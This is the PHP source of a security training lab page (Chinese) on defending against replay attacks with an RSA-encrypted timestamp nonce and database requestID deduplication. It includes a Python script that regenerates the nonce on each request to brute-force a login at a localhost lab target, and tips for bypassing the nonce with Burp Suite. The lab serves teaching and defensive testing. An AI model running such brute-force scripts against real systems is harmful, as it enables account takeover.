<?php
/**
 * Pikachu-Enhanced v2.0 - 前端加解密对抗: Level 8 - 防重放攻击综合测试
 */
$PIKA_ROOT_DIR = "../../";
require_once __DIR__ . '/encrypt_helper.inc.php';

// 处理 POST 请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $rawInput = file_get_contents("php://input");
    $data = json_decode($rawInput, true);

    if (!$data) {
        $data = $_POST;
    }

    if (isset($data['username'], $data['password'], $data['random'])) {
        $username = $data['username'];
        $password = $data['password'];
        $encryptedRandom = $data['random'];

        // 1. 利用 RSA 私钥解密客户端上报的毫秒级时间戳
        $timestampStr = '';
        $rOk = openssl_private_decrypt(base64_decode($encryptedRandom), $timestampStr, ENCRYPT_RSA_PRIVATE_KEY);
        if (!$rOk || empty($timestampStr)) {
            echo json_encode(['success' => false, 'error' => '随机 Nonce 时间戳解密失败，密文不合法'], JSON_UNESCAPED_UNICODE);
            exit;
        }

        $timestamp = floatval($timestampStr);
        $currentTimestamp = microtime(true) * 1000; // 当前服务器毫秒时间戳
        $timeWindow = 5000; // 5000毫秒 (5秒有效时间窗口)

        // 2. 严格校验时间窗口 (防止过期时间戳重放)
        if (abs($currentTimestamp - $timestamp) > $timeWindow) {
            echo json_encode([
                'success' => false,
                'error' => '❌ No Repeater: 请求时间戳已超出允许的时间窗口 (有效窗口 5000ms)，已被拦截！',
                'debug' => [
                    'client_time_ms' => $timestamp,
                    'server_time_ms' => $currentTimestamp,
                    'diff_ms' => round(abs($currentTimestamp - $timestamp), 2)
                ]
            ], JSON_UNESCAPED_UNICODE);
            exit;
        }

        // 3. 生成唯一的请求指纹 requestID
        $requestID = hash('sha256', $username . $password . $timestampStr);

        // 4. 查询 requests 数据表，检测该请求指纹是否已被消费 (防重放)
        $link = connect();
        $chkStmt = $link->prepare("SELECT id, timestamp FROM requests WHERE requestID = ? LIMIT 1");
        $chkStmt->bind_param('s', $requestID);
        $chkStmt->execute();
        $chkRes = $chkStmt->get_result();

        if ($chkRes && $chkRes->num_rows > 0) {
            echo json_encode([
                'success' => false,
                'error' => '❌ requestID exist: 检测到完全相同的重复请求指纹，重放攻击被彻底拦截！',
                'debug' => [
                    'requestID' => $requestID,
                    'status' => 'REPLAY_DETECTED_IN_DATABASE'
                ]
            ], JSON_UNESCAPED_UNICODE);
            exit;
        }

        // 5. 将该合法 requestID 写入数据库消费记录
        $insStmt = $link->prepare("INSERT INTO requests (requestID) VALUES (?)");
        $insStmt->bind_param('s', $requestID);
        $insStmt->execute();

        // 6. 进行用户密码校验
        $authRes = pika_encrypt_verify_user($username, $password);
        if ($authRes['success']) {
            echo json_encode([
                'success' => true,
                'message' => '🎉 防重放校验通过，身份认证成功！(Anti-Replay & Login Success)',
                'username' => $authRes['username'],
                'debug' => [
                    'generated_request_id' => $requestID,
                    'consumed_timestamp_ms' => $timestamp,
                    'time_drift_ms' => round(abs($currentTimestamp - $timestamp), 2)
                ]
            ], JSON_UNESCAPED_UNICODE);
        } else {
            echo json_encode([
                'success' => false,
                'error' => $authRes['error'],
                'debug' => [
                    'request_id_consumed' => $requestID,
                    'anti_replay_status' => 'PASSED'
                ]
            ], JSON_UNESCAPED_UNICODE);
        }
        exit;
    } else {
        echo json_encode(['success' => false, 'error' => '缺少必需参数 (username, password, random)'], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

$SELF_PAGE = substr($_SERVER['PHP_SELF'], strrpos($_SERVER['PHP_SELF'], '/') + 1);
if ($SELF_PAGE == "norepeater.php") {
    $ACTIVE = array_fill(0, 360, '');
    $ACTIVE[340] = 'active open';
    $ACTIVE[349] = 'active';
}

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<style>
.crypto-card {
    background: var(--bg-card, #ffffff);
    border: 1px solid var(--border-subtle, #e2e8f0);
    border-radius: 14px;
    padding: 24px;
    margin-bottom: 24px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
}
.inspector-panel {
    background: #0f172a;
    color: #e2e8f0;
    border-radius: 10px;
    padding: 16px;
    font-family: monospace;
    font-size: 13px;
    line-height: 1.6;
    overflow-x: auto;
}
.inspector-title {
    color: #94a3b8;
    font-size: 12px;
    text-transform: uppercase;
    margin-bottom: 8px;
    display: flex;
    align-items: center;
    gap: 6px;
}
.nav-tabs-custom {
    border-bottom: 2px solid #e2e8f0;
    margin-bottom: 20px;
    display: flex;
    gap: 8px;
}
.nav-tabs-custom button {
    background: none;
    border: none;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: 600;
    color: #64748b;
    border-bottom: 2px solid transparent;
    cursor: pointer;
    transition: all 0.2s;
}
.nav-tabs-custom button.active {
    color: #dc2626;
    border-bottom-color: #dc2626;
}
.tab-pane-custom {
    display: none;
}
.tab-pane-custom.active {
    display: block;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="<?php echo $PIKA_ROOT_DIR;?>index.php">首页</a></li>
                <li><a href="<?php echo $PIKA_ROOT_DIR;?>vul/encrypt/encrypt.php">前端加解密对抗</a></li>
                <li class="active">Level 8 - 防重放攻击综合测试</li>
            </ul>
        </div>

        <div class="page-content">
            <!-- 场景标题与说明 -->
            <div style="margin-bottom: 24px;">
                <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">
                    <span class="badge" style="background:#dc2626; font-size:12px; padding:4px 10px;">Level 8</span>
                    <span class="badge" style="background:#b91c1c; font-size:12px; padding:4px 10px;">Anti-Replay Defense</span>
                    <span class="badge" style="background:#4338ca; font-size:12px; padding:4px 10px;">RSA(Timestamp) + RequestID</span>
                </div>
                <h2 style="font-weight: 800; font-size: 24px; margin: 0 0 8px 0; color: #0f172a;">
                    防止重放攻击综合测试 (Anti-Replay With Nonce & RequestID)
                </h2>
                <p style="font-size: 14px; color: #64748b; margin: 0; line-height: 1.6;">
                    重放攻击 (Replay Attack) 是黑客直接抓取合法通信数据包并不经修改直接再次发出的攻击手段。本关采用“<strong>RSA 加密毫秒时间戳 + 窄时间窗口（5000ms） + 数据表唯一 RequestID 去重记录</strong>”的三重纵深机制，彻底终结单纯重发测试！
                </p>
            </div>

            <div class="row">
                <!-- 左侧: 交互式登录挑战卡片 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
                            <h4 style="margin:0; font-weight:700; font-size:16px; display:flex; align-items:center; gap:8px;">
                                <i class="ph-bold ph-timer" style="color:#dc2626;"></i> 防重放登录挑战
                            </h4>
                            <button type="button" class="btn btn-xs btn-danger" onclick="replayLastPacket()" id="replayBtn" disabled style="border-radius:6px;">
                                <i class="ph-bold ph-repeat"></i> 重放上一次密文包 (Simulate Replay)
                            </button>
                        </div>

                        <div id="loginAlert" style="display:none; margin-bottom:16px;"></div>

                        <form id="cryptoLoginForm" onsubmit="handleReplaySubmit(event)">
                            <div class="form-group" style="margin-bottom:14px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">账号 (Username):</label>
                                <input type="text" id="username" class="form-control" value="admin" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>
                            <div class="form-group" style="margin-bottom:18px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">密码 (Password):</label>
                                <input type="password" id="password" class="form-control" value="123456" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>

                            <button type="submit" id="submitBtn" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; padding:11px; background:#dc2626; border-color:#dc2626;">
                                <i class="ph-bold ph-shield-check"></i> 生成全新 RSA 时间戳 Nonce 并提交
                            </button>
                        </form>
                    </div>

                    <!-- 实时数据流监视器 -->
                    <div class="crypto-card" style="padding: 20px;">
                        <h4 style="margin:0 0 14px 0; font-weight:700; font-size:15px; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-broadcast" style="color:#0ea5e9;"></i> 防重放追踪流水线实时监视器
                        </h4>
                        
                        <div class="inspector-title"><i class="ph-bold ph-clock"></i> 1. 本地毫秒级时间戳 (Date.now())</div>
                        <div class="inspector-panel" id="inspTimestamp" style="margin-bottom:12px;">// 提交时生成...</div>

                        <div class="inspector-title"><i class="ph-bold ph-lock"></i> 2. RSA 加密后的 random Nonce 密文</div>
                        <div class="inspector-panel" id="inspRandomNonce" style="margin-bottom:12px;">// JSEncrypt(timestamp)...</div>

                        <div class="inspector-title"><i class="ph-bold ph-globe"></i> 3. 最终抓包 JSON</div>
                        <div class="inspector-panel" id="inspCipher" style="margin-bottom:12px;">// 等待发送...</div>

                        <div class="inspector-title"><i class="ph-bold ph-database"></i> 4. 服务端防重放与数据库响应</div>
                        <div class="inspector-panel" id="inspResponse">// 等待服务端响应...</div>
                    </div>
                </div>

                <!-- 右侧: 渗透与对抗指引 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <div class="nav-tabs-custom">
                            <button class="active" onclick="switchTab(event, 'tab1')"><i class="ph-bold ph-magnifying-glass"></i> 防重放机制解析</button>
                            <button onclick="switchTab(event, 'tab2')"><i class="ph-bold ph-terminal"></i> Python 实时发包</button>
                            <button onclick="switchTab(event, 'tab3')"><i class="ph-bold ph-wrench"></i> Burp 对抗实践</button>
                            <button onclick="switchTab(event, 'tab4')"><i class="ph-bold ph-shield-check"></i> 安全架构设计</button>
                        </div>

                        <!-- Tab 1: 防重放机制解析 -->
                        <div id="tab1" class="tab-pane-custom active">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🔍 双重防重放防线的协同机制</h5>
                            <ol style="font-size:13.5px; color:#475569; line-height:1.8; padding-left:20px;">
                                <li><strong>防线一：窄时间窗口 (5000ms)：</strong>客户端时间戳使用 RSA 公钥加密上报，攻击者无法篡改时间戳。当请求到达时，服务端计算 <code>abs(now - timestamp) > 5000ms</code>，若超过 5 秒直接拒绝，防止过期历史包重放。</li>
                                <li><strong>防线二：数据库唯一消费索引 (requests.requestID)：</strong>如果攻击者在 5 秒极窄窗口内快速重发同一个数据包，服务端通过 <code>hash(username + password + timestamp)</code> 查重，因数据库中已有记录，将立刻抛出 <code>requestID exist</code> 异常！</li>
                                <li><strong>测试验证：</strong>点击左侧界面的 <code>“重放上一次密文包”</code> 按钮，可立即亲眼目睹该请求在时间窗口内被唯一索引阻断的实况！</li>
                            </ol>
                        </div>

                        <!-- Tab 2: Python 实时发包 -->
                        <div id="tab2" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🐍 Python 毫秒级动态加密发包脚本</h5>
                            <pre style="background:#0f172a; color:#f8fafc; border-radius:8px; padding:14px; font-size:12px; line-height:1.5; max-height:360px; overflow-y:auto;"><code>import time
import base64
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

TARGET_URL = "http://127.0.0.1:8765/vul/encrypt/norepeater.php"

RSA_PUBLIC_PEM = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi
NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM
DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb
ocDbsNeCwNpRxwjIdQIDAQAB
-----END PUBLIC KEY-----"""

rsa_key = RSA.import_key(RSA_PUBLIC_PEM)
rsa_cipher = PKCS1_v1_5.new(rsa_key)

def encrypt_timestamp_nonce():
    # 动态获取当前毫秒级时间戳
    ts_ms = str(int(time.time() * 1000))
    enc_bytes = rsa_cipher.encrypt(ts_ms.encode('utf-8'))
    return base64.b64encode(enc_bytes).decode('utf-8')

# 爆破测试（每次请求实时生成全新的 RSA 时间戳）
passwords = ["admin", "root", "123456", "password"]
for pwd in passwords:
    fresh_nonce = encrypt_timestamp_nonce()
    payload = {
        "username": "admin",
        "password": pwd,
        "random": fresh_nonce
    }
    resp = requests.post(TARGET_URL, json=payload)
    data = resp.json()
    if data.get("success"):
        print(f"[+] 绕过防重放并爆破成功: admin / {pwd}")
        break
    else:
        print(f"[-] 密码 [{pwd}] -> {data.get('error')}")
</code></pre>
                        </div>

                        <!-- Tab 3: Burp 对抗实践 -->
                        <div id="tab3" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🛠️ Burp Suite 面对防重放的终极对策</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.6;">
                                当面对带有动态 Nonce 和防重放的接口时，直接在 Repeater 里点“Send”必定失败。解决方案：
                            </p>
                            <ul style="font-size:13px; color:#334155; line-height:1.7;">
                                <li><strong>借助 JSRpc 动态生成：</strong>通过浏览器执行 <code>generateRequestData()</code>，每次由浏览器在发送前一瞬间获取本地 <code>Date.now()</code> 并公钥加密，确保发往 Burp 的包永远在 5000ms 窗口以内。</li>
                                <li><strong>Burp 插件在发包钩子中动态加密：</strong>在插件中 hook <code>processProxyMessage</code>，在 HTTP 真正发出网卡的毫秒内更新 <code>random</code> 字段。</li>
                            </ul>
                        </div>

                        <!-- Tab 4: 安全设计规范 -->
                        <div id="tab4" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🛡️ 生产级分布式防重放方案</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.7;">
                                1. <strong>Redis 替代传统 SQL 查重：</strong>在微服务高并发场景下，频繁向 MySQL 写入 <code>requests</code> 记录会导致数据库写锁竞争与瓶颈。生产环境应使用 <code>Redis SETNX request_id "1" EX 5</code>，不仅性能提升数千倍，而且能借助 TTL 自动清理过期记录。<br>
                                2. <strong>时钟同步 (NTP):</strong> 毫秒级时间戳防重放要求客户端与服务端时钟基本一致。若客户端时间发生偏差，建议在应用启动时先拉取一次服务器标准时间并计算本地时钟漂移 (Clock Drift Offset)。
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="<?php echo $PIKA_ROOT_DIR;?>assets/js/jsencrypt.min.js"></script>

<script>
const RSA_PUB_KEY = `<?php echo trim(ENCRYPT_RSA_PUBLIC_KEY); ?>`;
let lastPacketPayload = null;

function switchTab(evt, tabId) {
    document.querySelectorAll('.nav-tabs-custom button').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-pane-custom').forEach(p => p.classList.remove('active'));
    evt.currentTarget.classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

function handleReplaySubmit(e) {
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const alertBox = document.getElementById('loginAlert');
    const submitBtn = document.getElementById('submitBtn');

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="ph-bold ph-spinner ph-spin"></i> 生成新鲜时间戳并提交...';

    // 1. 获取毫秒级时间戳
    const timestampMs = Date.now().toString();
    document.getElementById('inspTimestamp').textContent = timestampMs + " (ms)";

    // 2. RSA 公钥加密时间戳
    const rsa = new JSEncrypt();
    rsa.setPublicKey(RSA_PUB_KEY);
    const encryptedTimestamp = rsa.encrypt(timestampMs);

    document.getElementById('inspRandomNonce').textContent = encryptedTimestamp;

    // 3. 构建发送数据包
    const wirePayload = {
        username: username,
        password: password,
        random: encryptedTimestamp
    };

    lastPacketPayload = wirePayload;
    document.getElementById('replayBtn').disabled = false;
    document.getElementById('inspCipher').textContent = JSON.stringify(wirePayload, null, 2);

    // 4. 发送请求
    sendPacket(wirePayload);
}

function replayLastPacket() {
    if (!lastPacketPayload) {
        alert("尚未生成有效数据包！");
        return;
    }
    const alertBox = document.getElementById('loginAlert');
    alertBox.style.display = 'block';
    alertBox.className = 'alert alert-warning';
    alertBox.innerHTML = '<i class="ph-bold ph-repeat"></i> 正在直接重放上一次完全相同的密文包 (未经修改)...';

    document.getElementById('inspCipher').textContent = "// [REPLAYING PACKET]:\n" + JSON.stringify(lastPacketPayload, null, 2);
    sendPacket(lastPacketPayload);
}

function sendPacket(payload) {
    const alertBox = document.getElementById('loginAlert');
    const submitBtn = document.getElementById('submitBtn');

    fetch('norepeater.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json; charset=utf-8' },
        body: JSON.stringify(payload)
    })
    .then(r => r.json())
    .then(data => {
        document.getElementById('inspResponse').textContent = JSON.stringify(data, null, 2);
        alertBox.style.display = 'block';
        if (data.success) {
            alertBox.className = 'alert alert-success';
            alertBox.innerHTML = '<i class="ph-bold ph-check-circle"></i> <strong>' + data.message + '</strong> [' + data.username + '] 验证通过！';
        } else {
            alertBox.className = 'alert alert-danger';
            alertBox.innerHTML = '<i class="ph-bold ph-x-circle"></i> <strong>' + (data.error || '请求被拒绝') + '</strong>';
        }
    })
    .catch(err => {
        document.getElementById('inspResponse').textContent = 'Request Error: ' + err.message;
        alertBox.style.display = 'block';
        alertBox.className = 'alert alert-danger';
        alertBox.innerHTML = '<i class="ph-bold ph-warning"></i> 请求发生网络异常: ' + err.message;
    })
    .finally(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="ph-bold ph-shield-check"></i> 生成全新 RSA 时间戳 Nonce 并提交';
    });
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
